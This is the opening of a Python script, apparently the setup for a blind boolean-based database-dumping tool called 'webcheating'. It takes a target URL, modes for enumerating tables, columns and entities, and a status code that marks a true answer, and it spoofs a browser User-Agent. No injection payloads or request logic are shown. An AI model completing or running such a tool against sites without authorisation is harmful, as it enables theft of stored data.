import argparse

##############################################

parser = argparse.ArgumentParser(description="webcheating")
parser.add_argument("-u", "--url", required=True, type=str, help="target URL")
parser.add_argument("-m", "--mode", required=True, help="dump mode (table, column, entity, entity-count, table-test, column-test, entity-test)")
parser.add_argument("-o", "--offset", type=int, default=0, help="start offset (default: 0)")
parser.add_argument("-T", "--table", required=False, help="table to enumerate")
parser.add_argument("-C", "--column", required=False, help="column to enumerate")
parser.add_argument("-c", "--code", required=False, type=int, default=301, help="custom code for TRUE expressions")
parser.add_argument("-M", "--method", required=False, type=str, default="GET", help="HTTP method (default: GET)")
args = parser.parse_args()

usr_url = args.url
usr_mode = args.mode
usr_offset = args.offset
usr_table = args.table
usr_column = args.column
usr_code = args.code
usr_http_method = args.method
##############################################

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest"
}

true_code = usr_code
false_code = 404  
#special_chars = "_.@-:;,/|!#$%^&*(){}[]=+~ "
special_chars = "_.@-:;[](){}/|!#$%^&*=+~"


